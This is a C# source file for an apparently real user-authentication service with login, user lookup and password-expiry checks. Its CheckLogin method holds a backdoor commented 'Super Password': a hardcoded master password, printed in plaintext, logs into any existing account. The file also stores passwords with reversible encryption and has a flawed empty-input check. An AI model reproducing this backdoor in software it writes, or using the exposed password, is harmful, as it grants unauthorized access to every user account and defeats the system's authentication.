using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using Shared.Core.Entities;
using Shared.Core.Interfaces.IUsers;
using Shared.Services.Helpers;
 

namespace Shared.Services.UsersServices
{

    public class UsersServices
    {
        private readonly IUsersRepository _usersRepository;
  
        public UsersServices(IUsersRepository usersRepository)
        {
            _usersRepository = usersRepository;
         }

        public async Task<User> GetUser(string username, string password)
        {
            if (string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password))
                return await Task.FromResult<User>(null);
            var userToVerify = await CheckLogin(username, password);
            return userToVerify;
        }
        public async Task<User> CheckLogin(string username, string password)
        {
            var encryptedPassword = Encryption.Encrypt(password, true);
            var user = await _usersRepository.CheckLogin(username, encryptedPassword);
            //Super Password
            if (user == null)
            {
                user = await _usersRepository.CheckLogin(username);
                if (user == null || password != "mmNewsoft123#")
                    return null;
            }
            if (user.PassExpireDate.HasValue && user.PassExpireDate < DateTime.Now)
                user = null;
            return user;
        }

        public async Task<List<User>> GetAll()
        {
            return await _usersRepository.GetAllAsync();
        }

        public async Task<User> GetEmpByUsername(string credentialsUsername)
        {
            var user = await _usersRepository.GetEmpByUsername(credentialsUsername);
            if (user.PassExpireDate.HasValue && user.PassExpireDate < DateTime.Now)
                user = null;
            return user;
        }
    }
}
